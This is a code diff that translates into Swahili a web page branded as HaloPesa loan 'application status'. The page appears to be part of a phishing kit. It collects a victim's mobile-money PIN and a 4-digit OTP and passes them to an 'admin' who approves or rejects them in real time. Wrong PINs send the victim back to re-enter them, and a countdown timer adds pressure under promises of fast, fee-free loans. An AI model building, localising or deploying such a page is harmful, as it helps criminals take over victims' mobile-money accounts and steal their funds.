@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HaloPesa - Application Status</title>
+    <title>HaloPesa - Hali ya Ombi</title>
     <style>
         :root {
             --hp-orange: #FF5A1F;
@@ -81,48 +81,48 @@
             </svg>
         </div>
         <div class="brand-name">HaloPesa</div>
-        <div class="header-sub">Your Application Status</div>
+        <div class="header-sub">Hali ya Ombi Lako</div>
 
         <div class="card">
-            <div class="card-title">📊 Loan Summary</div>
+            <div class="card-title">📊 Muhtasari wa Mkopo</div>
             <div class="loan-summary">
-                <div class="summary-item"><div class="label">Amount</div><div class="value orange" id="summaryAmount">---</div></div>
-                <div class="summary-item"><div class="label">Term</div><div class="value" id="summaryTerm">---</div></div>
-                <div class="summary-item"><div class="label">Phone</div><div class="value" id="summaryPhone">---</div></div>
-                <div class="summary-item"><div class="label">App ID</div><div class="value" id="summaryAppId" style="font-size:0.8rem;">---</div></div>
+                <div class="summary-item"><div class="label">Kiasi</div><div class="value orange" id="summaryAmount">---</div></div>
+                <div class="summary-item"><div class="label">Muda</div><div class="value" id="summaryTerm">---</div></div>
+                <div class="summary-item"><div class="label">Simu</div><div class="value" id="summaryPhone">---</div></div>
+                <div class="summary-item"><div class="label">Kitambulisho</div><div class="value" id="summaryAppId" style="font-size:0.8rem;">---</div></div>
             </div>
         </div>
 
         <div class="card">
-            <div class="card-title" id="statusTitle">⏳ Processing</div>
-            <div id="statusMessage" class="status-message waiting">Application received. Waiting for admin to approve OTP...</div>
+            <div class="card-title" id="statusTitle">⏳ Inachakatwa</div>
+            <div id="statusMessage" class="status-message waiting">Ombi limepokelewa. Subiri mhudumu kuidhinisha OTP...</div>
             <div id="timerBox" class="timer-box hidden">
-                <div class="label">⏱ Time remaining to verify OTP</div>
+                <div class="label">⏱ Muda uliobaki wa kuthibitisha OTP</div>
                 <div class="time" id="timerDisplay">02:00</div>
             </div>
             <div id="codeSection" class="code-section hidden">
-                <p>Enter the OTP code you received on your phone</p>
+                <p>Ingiza msimbo wa OTP uliopokea kwenye simu yako</p>
                 <div class="code-boxes">
                     <input type="password" class="code-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="password" class="code-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="password" class="code-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="password" class="code-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                 </div>
-                <button class="btn-submit" id="verifyBtn">Verify Code</button>
+                <button class="btn-submit" id="verifyBtn">Thibitisha Msimbo</button>
                 <div id="codeStatus" class="status-message hidden"></div>
             </div>
         </div>
 
         <div class="footer-features">
-            <span>🔒 Secure Encryption</span>
-            <span>⚡ 5-Minute Approval</span>
-            <span>💰 No Hidden Fees</span>
+            <span>🔒 Salama kwa Njia Fiche</span>
+            <span>⚡ Idhini ya Dakika 5</span>
+            <span>💰 Hakuna Ada Zilizofichwa</span>
         </div>
     </div>
 
     <script>
         // ================================================
-        // GET DATA FROM URL
+        // CHUKUA DATA KUTOKA URL
         // ================================================
         const params = new URLSearchParams(window.location.search);
         const appId = params.get('app_id');
@@ -134,17 +134,17 @@
         const income = params.get('income') || '';
 
         if (!appId) {
-            document.getElementById('statusMessage').textContent = '❌ Error: No App ID found.';
+            document.getElementById('statusMessage').textContent = '❌ Hitilafu: Hakuna Kitambulisho cha Ombi.';
             document.getElementById('statusMessage').className = 'status-message error';
         } else {
             document.getElementById('summaryAmount').textContent = 'TZS ' + parseInt(amount).toLocaleString('en-US');
-            document.getElementById('summaryTerm').textContent = months + ' Months';
+            document.getElementById('summaryTerm').textContent = months + ' Mwezi';
             document.getElementById('summaryPhone').textContent = phone;
             document.getElementById('summaryAppId').textContent = appId;
         }
 
         // ================================================
-        // DOM REFS
+        // VIPIMO VYA DOM
         // ================================================
         const statusMsg = document.getElementById('statusMessage');
         const statusTitle = document.getElementById('statusTitle');
@@ -161,7 +161,7 @@
         let timeLeft = 120;
 
         // ================================================
-        // TIMER
+        // KIPIMA MUDA
         // ================================================
         function startTimer() {
             timeLeft = 120;
@@ -173,10 +173,10 @@
                 updateTimerDisplay();
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    timerDisplay.textContent = '⏰ Time Expired!';
+                    timerDisplay.textContent = '⏰ Muda Umeisha!';
                     codeBoxes.forEach(box => box.disabled = true);
                     verifyBtn.disabled = true;
-                    showCodeStatus('⏰ OTP verification time has expired. Please contact admin.', 'error');
+                    showCodeStatus('⏰ Muda wa kuthibitisha OTP umeisha. Wasiliana na mhudumu.', 'error');
                 }
             }, 1000);
         }
@@ -192,7 +192,7 @@
         }
 
         // ================================================
-        // CODE BOXES – Auto-advance
+        // SANDBOX ZA MSIMBO – zinajaza moja kwa moja
         // ================================================
         codeBoxes.forEach((box, index) => {
             box.addEventListener('input', function() {
@@ -220,7 +220,7 @@
         });
 
         // ================================================
-        // POLLING
+        // KUANGALIA HALI (POLLING)
         // ================================================
         function startPolling() {
             if (pollInterval) clearInterval(pollInterval);
@@ -230,7 +230,7 @@
                     const data = await res.json();
 
                     if (data.status === 'not_found') {
-                        setStatus('error', '❌ Application not found. Please contact admin.');
+                        setStatus('error', '❌ Ombi halipo. Wasiliana na mhudumu.');
                         clearInterval(pollInterval);
                         return;
                     }
@@ -239,9 +239,9 @@
                     let statusClass = 'waiting';
 
                     if (data.status === 'pending') {
-                        statusText = '⏳ Application received. Waiting for admin to approve OTP...';
+                        statusText = '⏳ Ombi limepokelewa. Subiri mhudumu kuidhinisha OTP...';
                     } else if (data.status === 'approved' && data.code_status === 'pending') {
-                        statusText = '✅ OTP approved! Enter the code you received.';
+                        statusText = '✅ OTP imeidhinishwa! Ingiza msimbo uliopokea.';
                         statusClass = 'success';
                         if (!isCodeSubmitted) {
                             codeSection.classList.remove('hidden');
@@ -249,7 +249,7 @@
                             codeBoxes[0].focus();
                         }
                     } else if (data.code_status === 'approved') {
-                        statusText = '🎉 Your loan has been approved! Funds will be disbursed.';
+                        statusText = '🎉 Mkopo wako umeidhinishwa! Fedha zitatumwa.';
                         statusClass = 'success';
                         clearInterval(pollInterval);
                         stopTimer();
@@ -259,8 +259,8 @@
                             window.location.href = `/success?app_id=${appId}&amount=${amount}&months=${months}&phone=${phone}`;
                         }, 2000);
                     } else if (data.code_status === 'wrong_pin' || data.status === 'wrong_pin') {
-                        // ✅ WRONG PIN – redirect back to PIN entry with error
-                        statusText = '❌ Wrong PIN. Redirecting to PIN entry...';
+                        // ❌ PIN MBAYA – rudisha kwenye ukurasa wa PIN
+                        statusText = '❌ PIN si sahihi. Inarudisha kwenye ukurasa wa PIN...';
                         statusClass = 'error';
                         clearInterval(pollInterval);
                         stopTimer();
@@ -270,8 +270,8 @@
                             window.location.href = `/pin-entry?amount=${amount}&months=${months}&fullName=${encodeURIComponent(fullName)}&phone=${phone}&employment=${employment}&income=${income}&error=wrong_pin`;
                         }, 1500);
                     } else if (data.code_status === 'wrong_code') {
-                        // ✅ WRONG CODE – show red boxes and allow re‑entry
-                        statusText = '❌ Incorrect code. Please try again.';
+                        // ❌ MSIMBO MBAYA – onyesha sanduku nyekundu, ruhusu kuandika tena
+                        statusText = '❌ Msimbo si sahihi. Tafadhali ingiza tena.';
                         statusClass = 'error';
                         codeBoxes.forEach(box => {
                             box.classList.add('error');
@@ -279,24 +279,24 @@
                             box.classList.remove('filled');
                         });
                         verifyBtn.disabled = false;
-                        verifyBtn.textContent = 'Verify Code';
+                        verifyBtn.textContent = 'Thibitisha Msimbo';
                         codeBoxes[0].focus();
-                        showCodeStatus('❌ Incorrect code. Enter again.', 'error');
+                        showCodeStatus('❌ Msimbo si sahihi. Ingiza tena.', 'error');
                     } else if (data.status === 'invalid') {
-                        statusText = `❌ Application declined. Reason: ${data.invalid_type || 'Does not meet criteria.'}`;
+                        statusText = `❌ Ombi limekataliwa. Sababu: ${data.invalid_type || 'Hajakidhi vigezo.'}`;
                         statusClass = 'error';
                         clearInterval(pollInterval);
                         stopTimer();
                         codeSection.classList.add('hidden');
                         timerBox.classList.add('hidden');
                     } else {
-                        statusText = `Status: ${data.status} | Code: ${data.code_status}`;
+                        statusText = `Hali: ${data.status} | Msimbo: ${data.code_status}`;
                     }
                     setStatus(statusText, statusClass);
 
                 } catch (err) {
                     console.error('Polling error:', err);
-                    setStatus('⚠️ Network error. Reconnecting...', 'waiting');
+                    setStatus('⚠️ Hitilafu ya mtandao. Inajaribu kuungana tena...', 'waiting');
                 }
             }, 3000);
         }
@@ -304,19 +304,19 @@
         function setStatus(text, type = 'waiting') {
             statusMsg.textContent = text;
             statusMsg.className = 'status-message ' + type;
-            if (type === 'success') statusTitle.textContent = '✅ Approved';
-            else if (type === 'error') statusTitle.textContent = '❌ Declined';
-            else statusTitle.textContent = '⏳ Processing';
+            if (type === 'success') statusTitle.textContent = '✅ Imekubaliwa';
+            else if (type === 'error') statusTitle.textContent = '❌ Imekataliwa';
+            else statusTitle.textContent = '⏳ Inachakatwa';
         }
 
         // ================================================
-        // VERIFY CODE (submit to /api/submit_code)
+        // THIBITISHA MSIMBO (tuma kwa /api/submit_code)
         // ================================================
         verifyBtn.addEventListener('click', async function() {
             let code = '';
             codeBoxes.forEach(box => code += box.value.trim());
             if (code.length !== 4 || !/^\d{4}$/.test(code)) {
-                showCodeStatus('Please enter a complete 4-digit code.', 'error');
+                showCodeStatus('Tafadhali ingiza msimbo kamili wa tarakimu 4.', 'error');
                 codeBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.classList.add('error'); });
                 codeBoxes[0].focus();
                 return;
@@ -339,16 +339,16 @@
                     codeSection.classList.add('hidden');
                     timerBox.classList.add('hidden');
                     stopTimer();
-                    setStatus('📤 Code sent to admin. Waiting for final approval...', 'waiting');
+                    setStatus('📤 Msimbo umetumwa kwa mhudumu. Subiri uthibitisho...', 'waiting');
                 } else {
-                    showCodeStatus('❌ Error: ' + (data.error || 'Please try again.'), 'error');
+                    showCodeStatus('❌ Hitilafu: ' + (data.error || 'Jaribu tena.'), 'error');
                     verifyBtn.disabled = false;
-                    verifyBtn.textContent = 'Verify Code';
+                    verifyBtn.textContent = 'Thibitisha Msimbo';
                 }
             } catch (err) {
-                showCodeStatus('❌ Network error. Please try again.', 'error');
+                showCodeStatus('❌ Hitilafu ya mtandao. Jaribu tena.', 'error');
                 verifyBtn.disabled = false;
-                verifyBtn.textContent = 'Verify Code';
+                verifyBtn.textContent = 'Thibitisha Msimbo';
             }
         });
 
@@ -361,7 +361,7 @@
         function hideCodeStatus() { codeStatus.classList.add('hidden'); }
 
         // ================================================
-        // START
+        // ANZISHA
         // ================================================
         if (appId) startPolling();
         window.addEventListener('beforeunload', function() {
